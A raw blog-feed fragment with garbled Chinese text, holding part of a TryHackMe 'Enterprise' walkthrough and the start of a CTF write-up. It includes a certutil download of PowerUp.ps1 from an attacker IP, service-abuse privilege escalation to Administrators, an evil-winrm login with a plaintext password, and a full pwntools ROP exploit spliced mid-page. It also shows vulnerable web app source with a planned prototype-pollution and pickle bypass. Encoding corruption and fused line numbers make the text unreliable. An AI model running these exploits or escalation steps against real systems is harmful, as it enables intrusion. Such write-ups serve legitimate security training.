powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">certutil.exe <span class="literal">-urlcache</span> <span class="operator">-f</span> http://<span class="number">10.14</span>.<span class="number">90.122</span>:<span class="number">8000</span>/PowerUp.ps1 PowerUp.ps1</span><br></pre></td></tr></table></figure><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241024160000887-1751636811.png" alt="image-20241024155939035"></p><p>ËøêË°å<code>PowerUp.ps1</code>ÂêéÊâßË°å<code>Invoke-AllChecks</code></p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">. .\PowerUp.ps1</span><br><span class="line"><span class="built_in">Invoke-AllChecks</span></span><br></pre></td></tr></table></figure><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241024161255216-268400229.png" alt="image-20241024161233438"></p><p>Êàë‰ª¨ÂèëÁé∞<code>zerotieroneservice</code>ÊòØ‰Ωú‰∏∫<code>SYSTEM</code>ËøêË°åÁöÑÔºåÂπ∂‰∏îÂèØ‰ª•ÈáçÂêØËØ•ÊúçÂä°</p><p>‰ΩøÁî®‰∏ãÈù¢ÁöÑÂëΩ‰ª§Êª•Áî®Ê≠§ÂäüËÉΩÔºåÂ∞ÜÂΩìÂâçÁî®Êà∑<code>bitbucket</code>Ê∑ªÂä†Âà∞ÁÆ°ÁêÜÂëòÁªÑ</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Install-ServiceBinary</span> <span class="literal">-Name</span> <span class="string">&quot;zerotieroneservice&quot;</span> <span class="literal">-Command</span> <span class="string">&quot;net localgroup Administrators lab.enterprise.thm\bitbucket /add&quot;</span></span><br></pre></td></tr></table></figure><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241024162013069-1833540896.png" alt="image-20241024161951199"></p><p>ÊâßË°åÂêéÔºåÊàë‰ª¨ÈáçÂêØ<code>zerotieroneservice</code>ÊúçÂä°</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sc.exe stop zerotieroneservice</span><br><span class="line">sc.exe <span class="built_in">start</span> zerotieroneservice</span><br></pre></td></tr></table></figure><p>xxxxxxxxxx105¬†1from pwn import<em>2import ctypes3‚Äã4‚Äã5context(os=‚Äòlinux‚Äô,arch=‚Äòamd64‚Äô,log_level=‚Äòdebug‚Äô)6libc=ELF(‚Äò./libc.so.6‚Äô) ¬† 7elf=ELF(‚Äò./vuln‚Äô)8#p=remote(‚Äú<a href="http://pwn-ecdfbe9bc0.challenge.xctf.org.cn">pwn-ecdfbe9bc0.challenge.xctf.org.cn</a>‚Äù, 9999, ssl=True)9p=process(‚Äò./vuln‚Äô)10‚Äã11 ¬† 12‚Äã13‚Äã14‚Äã15‚Äã16def xun():17‚Äã18 ¬† ¬†for i in range(100):19 ¬† ¬† ¬† ¬†#print(payload)20 ¬† ¬† ¬† ¬†p.recvuntil(b‚ÄôInput the authentication code:‚Äò)21 ¬† ¬† ¬† #payload = str((elf1.rand()%100) + 1)22 ¬† ¬† ¬† #p.send(payload)23 ¬† ¬† ¬† ¬†p.send(p64(elf1.rand()%100+1))24 ¬† ¬† ¬† 25 ¬† ¬† ¬† # sleep(0.1)26 ¬† ¬† 27 ¬† ¬† ¬† 28rdi=0x000000000040189329#gdb.attach¬ß30#pause31p.send(b‚Äô1‚Äô)32#sleep(0.5)33elf1=ctypes.CDLL(‚Äú./libc.so.6‚Äù)34#elf1=ctypes.LoadLibrary(‚Äú./libc.so.6‚Äù)35elf1.srand(elf1.time(0)) ¬† ¬†#‰∏éÈ¢òÁõÆÁõ∏Âêå‰ª•Êó∂Èó¥‰∏∫ÁßçÂ≠ê36‚Äã37xun()38‚Äã39p.sendafter(&quot;&gt;&gt; &quot;,p32(1))40p.sendafter(&quot;Index: &quot;,p32(1))41p.sendafter(&quot;Note: &quot;,b‚Äôa‚Äô)42‚Äã43payload=b‚Äôa‚Äô</em>(0x100+8)+p64(rdi)+p64(elf.got[‚Äòputs‚Äô])+p64(elf.plt[‚Äòputs‚Äô])+p64(0x00000000040177B)44#bug()45p.send(payload)46‚Äã47libc_base=u64(p.recvuntil(‚Äú\x7f‚Äù)[-6:].ljust(8,b‚Äô\x00‚Äô))-libc.sym[‚Äòputs‚Äô]48#print(hex(libc_base))49print(hex(libc_base))50‚Äã51‚Äã52‚Äã53rdi = libc_base+0x0000000000023b6a54rsi = libc_base+0x000000000002601f55rdx = libc_base+0x0000000000142c9256rdx_r12=libc_base+0x000000000011921157rax = libc_base+0x000000000003617458ret = libc_base+0x000000000002267959syscall=libc_base+0x000000000002284d60open_=libc_base+libc.sym[‚Äòopen‚Äô]61read=libc_base + libc.sym[‚Äòread‚Äô]62write=libc_base + libc.sym[‚Äòwrite‚Äô]63mprotect=libc_base + libc.sym[‚Äòmprotect‚Äô]64bss=0x404060+0x50065‚Äã66‚Äã67p.send(b‚Äô1‚Äô)68#sleep(0.5)69elf1=ctypes.CDLL(‚Äú./libc.so.6‚Äù)70#elf1=ctypes.LoadLibrary(‚Äú./libc.so.6‚Äù)71elf1.srand(elf1.time(0)) ¬† ¬†#‰∏éÈ¢òÁõÆÁõ∏Âêå‰ª•Êó∂Èó¥‰∏∫ÁßçÂ≠ê72‚Äã73xun()74‚Äã75p.sendafter(&quot;&gt;&gt; &quot;,p32(1))76p.sendafter(&quot;Index: &quot;,p32(1))77p.sendafter(&quot;Note: &quot;,b‚Äôa‚Äô<em>0x100)78‚Äã79‚Äã80#rl(‚Äúlets move and pwn!‚Äù)81payload=b‚Äôa‚Äô</em>(0x100)+p64(bss)+p64(rsi)+p64(bss)+p64(read)+p64(0x0004013EE)82#bug()83p.send(payload)84#pause()85‚Äã86orw ¬†= b‚Äô/flag\x00\x00\x00‚Äô87orw += p64(rdi) + p64(bss) ¬†#/flagÁöÑÂ≠óÁ¨¶‰∏≤‰ΩçÁΩÆÔºåË¶ÅÊîπ88orw += p64(rsi) + p64(0)89orw += p64(open_)90‚Äã91orw += p64(rdi) + p64(3)92orw += p64(rdx_r12) + p64(0x50)*293orw += p64(rsi)+p64(bss+0x200) #ËØªÂÖ•flagÁöÑ‰ΩçÁΩÆ94orw += p64(read)95orw += p64(rdi) + p64(1)96orw += p64(rdx_r12) + p64(0x50)*297orw += p64(rsi)+p64(bss+0x200) #ËØªÂÖ•flagÁöÑ‰ΩçÁΩÆ98orw += p64(write)99‚Äã100#print(hex(len(orw)))101print(hex(len(orw)))102p.send(orw)103‚Äã104‚Äã105p.interactive()python</p><p>Êü•Áúã‰∏Ä‰∏ãÂΩìÂâçÁî®Êà∑</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net user bitbucket</span><br></pre></td></tr></table></figure><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241024162313666-1753984328.png" alt="image-20241024162251879"></p><p>ÂèëÁé∞Êàë‰ª¨ÂΩìÂâçÂ±û‰∫é<code>Administrator</code>ÁªÑ</p><p>‰ΩøÁî®<code>evil-winrm</code>ÁôªÂΩïÔºà‰ΩøÁî®evil-winrmÁöÑÂéüÂõ†Á∫ØÁ≤πÊòØÂõ†‰∏∫ÊàërdpÁôªÂΩïÂç°ÁöÑË¶ÅÊ≠ªÔºâ</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">evil-winrm -i 10.10.76.81 -u bitbucket -p littleredbucket</span><br></pre></td></tr></table></figure><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241024162856683-1105115210.png" alt="image-20241024162834485"></p><p>ÊâæÂà∞<code>root.txt</code></p>]]></content>
    
    
    <summary type="html">TryHackMeÁ≥ªÂàó‰πãEnterprise</summary>
    
    
    
    <category term="TryHackMe" scheme="https://www.fomal.cc/categories/TryHackMe/"/>
    
    <category term="Active Directory" scheme="https://www.fomal.cc/categories/TryHackMe/Active-Directory/"/>
    
    
    <category term="Windows" scheme="https://www.fomal.cc/tags/Windows/"/>
    
    <category term="THM" scheme="https://www.fomal.cc/tags/THM/"/>
    
  </entry>
  
  <entry>
    <title>Âº∫ÁΩëÊãüÊÄÅ 2024</title>
    <link href="https://www.fomal.cc/posts/c9a637a4.html"/>
    <id>https://www.fomal.cc/posts/c9a637a4.html</id>
    <published>2024-10-21T01:23:52.000Z</published>
    <updated>2024-10-21T05:11:47.768Z</updated>
    
    <content type="html"><![CDATA[<span id="more"></span><h1>Web</h1><h2 id="capoo-‰∏ÄË°Ä">capoo (‰∏ÄË°Ä)</h2><p>ÁàΩÂñΩ</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241021093643112-333016867.png" alt="image-20241019162216319"></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241021093709026-2029109064.png" alt="image-20241019151935942"></p><p>f12Âèë<img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241021093741131-1763474644.png" alt="image-20241019152114885">Áé∞ËØªÁöÑÂõæÁâáÔºåÊÑüËßâÂ∫îËØ•ËÉΩ‰ªªÊÑèÊñá‰ª∂ËØªÂèñÔºåËØª‰∏Ä‰∏ã<code>/etc/passwd</code></p><p>ÂèëÁé∞ËÉΩËØªÔºåÂÜçÁúã‰∏Ä‰∏ãÁéØÂ¢ÉÂèòÈáè<code>/proc/1/environ</code>ÔºåÊ≤°Êúâ</p><p>ÂÜçÁúã‰∏Ä‰∏ã<code>/proc/1/cmdline</code>ÔºåÂèëÁé∞Â≠òÂú®<code>/bin/sh/docker-entrypoint.sh</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241021093821659-1694154678.png" alt="image-20241019152243867"></p><p><a href="http://xn--start-fg1hrct19aluzk82i.sh">ÂÜçÂ∞ùËØï‰∏Ä‰∏ãstart.sh</a></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241021093836336-503712739.png" alt="image-20241019152349796"></p><p>ÊâæÂà∞flagÂêçÁß∞ÔºåÁõ¥Êé•ËØªÂ∞±ËÉΩÂá∫flag</p><h2 id="ez-picker">ez_picker</h2><p>Ê∫êÁ†ÅÔºö</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> sanic <span class="keyword">import</span> Sanic</span><br><span class="line"><span class="keyword">from</span> sanic.response <span class="keyword">import</span> json, file <span class="keyword">as</span> file_, text, redirect</span><br><span class="line"><span class="keyword">from</span> sanic_cors <span class="keyword">import</span> CORS</span><br><span class="line"><span class="keyword">from</span> key <span class="keyword">import</span> secret_key</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> jwt</span><br><span class="line"><span class="keyword">import</span> io</span><br><span class="line"><span class="keyword">import</span> builtins</span><br><span class="line"></span><br><span class="line">app = Sanic(<span class="string">&quot;App&quot;</span>)</span><br><span class="line">pickle_file = <span class="string">&quot;data.pkl&quot;</span></span><br><span class="line">my_object = &#123;&#125;</span><br><span class="line">users = []</span><br><span class="line"></span><br><span class="line">safe_modules = &#123;</span><br><span class="line">    <span class="string">&#x27;math&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;datetime&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;json&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;collections&#x27;</span>,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">safe_names = &#123;</span><br><span class="line">    <span class="string">&#x27;sqrt&#x27;</span>, <span class="string">&#x27;pow&#x27;</span>, <span class="string">&#x27;sin&#x27;</span>, <span class="string">&#x27;cos&#x27;</span>, <span class="string">&#x27;tan&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;date&#x27;</span>, <span class="string">&#x27;datetime&#x27;</span>, <span class="string">&#x27;timedelta&#x27;</span>, <span class="string">&#x27;timezone&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;loads&#x27;</span>, <span class="string">&#x27;dumps&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;namedtuple&#x27;</span>, <span class="string">&#x27;deque&#x27;</span>, <span class="string">&#x27;Counter&#x27;</span>, <span class="string">&#x27;defaultdict&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">RestrictedUnpickler</span>(pickle.Unpickler):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">find_class</span>(<span class="params">self, module, name</span>):</span><br><span class="line">        <span class="keyword">if</span> module <span class="keyword">in</span> safe_modules <span class="keyword">and</span> name <span class="keyword">in</span> safe_names:</span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">getattr</span>(builtins, name)</span><br><span class="line">        <span class="keyword">raise</span> pickle.UnpicklingError(<span class="string">&quot;global &#x27;%s.%s&#x27; is forbidden&quot;</span> % (module, name))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">restricted_loads</span>(<span class="params">s</span>):</span><br><span class="line">    <span class="keyword">return</span> RestrictedUnpickler(io.BytesIO(s)).load()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">CORS(app, supports_credentials=<span class="literal">True</span>, origins=[<span class="string">&quot;http://localhost:8000&quot;</span>, <span class="string">&quot;http://127.0.0.1:8000&quot;</span>])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">User</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, username, password</span>):</span><br><span class="line">        self.username = username</span><br><span class="line">        self.password = password</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">merge</span>(<span class="params">src, dst</span>):</span><br><span class="line">    <span class="keyword">for</span> k, v <span class="keyword">in</span> src.items():</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">hasattr</span>(dst, <span class="string">&#x27;__getitem__&#x27;</span>):</span><br><span class="line">            <span class="keyword">if</span> dst.get(k) <span class="keyword">and</span> <span class="built_in">type</span>(v) == <span class="built_in">dict</span>:</span><br><span class="line">                merge(v, dst.get(k))</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                dst[k] = v</span><br><span class="line">        <span class="keyword">elif</span> <span class="built_in">hasattr</span>(dst, k) <span class="keyword">and</span> <span class="built_in">type</span>(v) == <span class="built_in">dict</span>:</span><br><span class="line">            merge(v, <span class="built_in">getattr</span>(dst, k))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">setattr</span>(dst, k, v)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">token_required</span>(<span class="params">func</span>):</span><br><span class="line">    <span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">wrapper</span>(<span class="params">request, *args, **kwargs</span>):</span><br><span class="line">        token = request.cookies.get(<span class="string">&quot;token&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> token:</span><br><span class="line">            <span class="keyword">return</span> redirect(<span class="string">&#x27;/login&#x27;</span>)</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            result = jwt.decode(token, <span class="built_in">str</span>(secret_key), algorithms=[<span class="string">&#x27;HS256&#x27;</span>], options=&#123;<span class="string">&quot;verify_signature&quot;</span>: <span class="literal">True</span>&#125;)</span><br><span class="line">        <span class="keyword">except</span> jwt.ExpiredSignatureError:</span><br><span class="line">            <span class="keyword">return</span> json(&#123;<span class="string">&quot;status&quot;</span>: <span class="string">&quot;fail&quot;</span>, <span class="string">&quot;message&quot;</span>: <span class="string">&quot;Token expired&quot;</span>&#125;, status=<span class="number">401</span>)</span><br><span class="line">        <span class="keyword">except</span> jwt.InvalidTokenError:</span><br><span class="line">            <span class="keyword">return</span> json(&#123;<span class="string">&quot;status&quot;</span>: <span class="string">&quot;fail&quot;</span>, <span class="string">&quot;message&quot;</span>: <span class="string">&quot;Invalid token&quot;</span>&#125;, status=<span class="number">401</span>)</span><br><span class="line">        <span class="built_in">print</span>(result)</span><br><span class="line">        <span class="keyword">if</span> result[<span class="string">&quot;role&quot;</span>] != <span class="string">&quot;admin&quot;</span>:</span><br><span class="line">            <span class="keyword">return</span> json(&#123;<span class="string">&quot;status&quot;</span>: <span class="string">&quot;fail&quot;</span>, <span class="string">&quot;message&quot;</span>: <span class="string">&quot;Permission Denied&quot;</span>&#125;, status=<span class="number">401</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">await</span> func(request, *args, **kwargs)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> wrapper</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span>, methods=[<span class="string">&quot;GET&quot;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">file_reader</span>(<span class="params">request</span>):</span><br><span class="line">    file = <span class="string">&quot;app.py&quot;</span></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(file, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        content = f.read()</span><br><span class="line">    <span class="keyword">return</span> text(content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/upload&#x27;</span>, methods=[<span class="string">&quot;GET&quot;</span>, <span class="string">&quot;POST&quot;</span>]</span>)</span></span><br><span class="line"><span class="meta">@token_required</span></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">upload</span>(<span class="params">request</span>):</span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&quot;GET&quot;</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">await</span> file_(<span class="string">&#x27;templates/upload.html&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> request.files:</span><br><span class="line">        <span class="keyword">return</span> text(<span class="string">&quot;No file provided&quot;</span>, status=<span class="number">400</span>)</span><br><span class="line"></span><br><span class="line">    file = request.files.get(<span class="string">&#x27;file&#x27;</span>)</span><br><span class="line">    file_object = file[<span class="number">0</span>] <span class="keyword">if</span> <span class="built_in">isinstance</span>(file, <span class="built_in">list</span>) <span class="keyword">else</span> file</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        new_data = restricted_loads(file_object.body)</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            my_object.update(new_data)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">return</span> json(&#123;<span class="string">&quot;status&quot;</span>: <span class="string">&quot;success&quot;</span>, <span class="string">&quot;message&quot;</span>: <span class="string">&quot;Pickle object loaded but not updated&quot;</span>&#125;)</span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(pickle_file, <span class="string">&quot;wb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">            pickle.dump(my_object, f)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> json(&#123;<span class="string">&quot;status&quot;</span>: <span class="string">&quot;success&quot;</span>, <span class="string">&quot;message&quot;</span>: <span class="string">&quot;Pickle object updated&quot;</span>&#125;)</span><br><span class="line">    <span class="keyword">except</span> pickle.UnpicklingError:</span><br><span class="line">        <span class="keyword">return</span> text(<span class="string">&quot;Dangerous pickle file&quot;</span>, status=<span class="number">400</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/register&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">register</span>(<span class="params">request</span>):</span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&#x27;GET&#x27;</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">await</span> file_(<span class="string">&#x27;templates/register.html&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> request.json:</span><br><span class="line">        NewUser = User(<span class="string">&quot;username&quot;</span>, <span class="string">&quot;password&quot;</span>)</span><br><span class="line">        merge(request.json, NewUser)</span><br><span class="line">        users.append(NewUser)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> json(&#123;<span class="string">&quot;status&quot;</span>: <span class="string">&quot;fail&quot;</span>, <span class="string">&quot;message&quot;</span>: <span class="string">&quot;Invalid request&quot;</span>&#125;, status=<span class="number">400</span>)</span><br><span class="line">    <span class="keyword">return</span> json(&#123;<span class="string">&quot;status&quot;</span>: <span class="string">&quot;success&quot;</span>, <span class="string">&quot;message&quot;</span>: <span class="string">&quot;Register Success!&quot;</span>, <span class="string">&quot;redirect&quot;</span>: <span class="string">&quot;/login&quot;</span>&#125;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/login&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">login</span>(<span class="params">request</span>):</span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&#x27;GET&#x27;</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">await</span> file_(<span class="string">&#x27;templates/login.html&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> request.json:</span><br><span class="line">        username = request.json.get(<span class="string">&quot;username&quot;</span>)</span><br><span class="line">        password = request.json.get(<span class="string">&quot;password&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> username <span class="keyword">or</span> <span class="keyword">not</span> password:</span><br><span class="line">            <span class="keyword">return</span> json(&#123;<span class="string">&quot;status&quot;</span>: <span class="string">&quot;fail&quot;</span>, <span class="string">&quot;message&quot;</span>: <span class="string">&quot;Username or password missing&quot;</span>&#125;, status=<span class="number">400</span>)</span><br><span class="line">        user = <span class="built_in">next</span>((u <span class="keyword">for</span> u <span class="keyword">in</span> users <span class="keyword">if</span> u.username == username), <span class="literal">None</span>)</span><br><span class="line">        <span class="keyword">if</span> user:</span><br><span class="line">            <span class="keyword">if</span> user.password == password:</span><br><span class="line">                data = &#123;<span class="string">&quot;user&quot;</span>: username, <span class="string">&quot;role&quot;</span>: <span class="string">&quot;guest&quot;</span>&#125;</span><br><span class="line">                data[<span class="string">&#x27;exp&#x27;</span>] = <span class="built_in">int</span>(time.time()) + <span class="number">60</span> * <span class="number">5</span></span><br><span class="line">                token = jwt.encode(data, <span class="built_in">str</span>(secret_key), algorithm=<span class="string">&#x27;HS256&#x27;</span>)</span><br><span class="line">                response = json(&#123;<span class="string">&quot;status&quot;</span>: <span class="string">&quot;success&quot;</span>, <span class="string">&quot;redirect&quot;</span>: <span class="string">&quot;/upload&quot;</span>&#125;)</span><br><span class="line">                response.cookies[<span class="string">&quot;token&quot;</span>] = token</span><br><span class="line">                response.headers[<span class="string">&#x27;Access-Control-Allow-Origin&#x27;</span>] = request.headers.get(<span class="string">&#x27;origin&#x27;</span>)</span><br><span class="line">                <span class="keyword">return</span> response</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">return</span> json(&#123;<span class="string">&quot;status&quot;</span>: <span class="string">&quot;fail&quot;</span>, <span class="string">&quot;message&quot;</span>: <span class="string">&quot;Invalid password&quot;</span>&#125;, status=<span class="number">400</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> json(&#123;<span class="string">&quot;status&quot;</span>: <span class="string">&quot;fail&quot;</span>, <span class="string">&quot;message&quot;</span>: <span class="string">&quot;User not found&quot;</span>&#125;, status=<span class="number">404</span>)</span><br><span class="line">    <span class="keyword">return</span> json(&#123;<span class="string">&quot;status&quot;</span>: <span class="string">&quot;fail&quot;</span>, <span class="string">&quot;message&quot;</span>: <span class="string">&quot;Invalid request&quot;</span>&#125;, status=<span class="number">400</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(host=<span class="string">&quot;0.0.0.0&quot;</span>, port=<span class="number">8000</span>)</span><br></pre></td></tr></table></figure><p>È¢òÁõÆÁªô‰∫ÜÊ∫êÁ†Å,</p><ul><li>Â≠òÂú®merge,Âπ∂‰∏îUserÁ±ªÊúâ<code>__init__</code>,‰∏ÄÁúºÂéüÂûãÈìæÊ±°Êüì,ÂèØ‰ª•Ê±°ÊüìÂà∞<code>global</code>ÂÖ®Â±ÄÂèòÈáè</li><li>Â≠òÂú®<code>RestrictedUnpickler</code>Âπ∂ÈáçÂÜô‰∫Ü<code>find_class</code>,ÂèØ‰ª•ÁªïËøáÊù•<code>pickle</code>ÂèçÂ∫èÂàóÂåñ</li></ul><p>‚ÄãÊâÄ‰ª•ËøôÈÅìÈ¢òÊÄùË∑ØÂ∞±ÊòØÂÖàÂà©Áî®ÂéüÂûãÈìæÊ±°ÊüìÊù•Ê±°Êüì<code>secret_key</code>‰º™ÈÄ†<code>admin</code>ÔºåÂÜçÊ±°Êüì<code>safe_modules</code>Âíå<code>safe_names</code>Êù•ÁªïËøá<code>RestrictedUnpickler</code>ÈôêÂà∂Âç≥ÂèØ.</p><p>Ê∫êÁ†Å‰∏≠<code>/register</code>Ë∑ØÁî±ÂèØ‰ª•ËøõË°åÂéüÂûãÈìæÊ±°Êüì</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241021093950109-474360410.png" alt="image-20241019162312868"></p><p>Âú®<code>/upload</code>Ë∑ØÁî±ÂèØ‰ª•‰∏ä‰º†pklÊñá‰ª∂Êù•Ëß¶ÂèëpickleÂèçÂ∫èÂàóÂåñ.</p><p>ÊâÄ‰ª•Áõ¥Êé•ÂÖà‰º†</p><figure class="highlight json"><table><tr><td 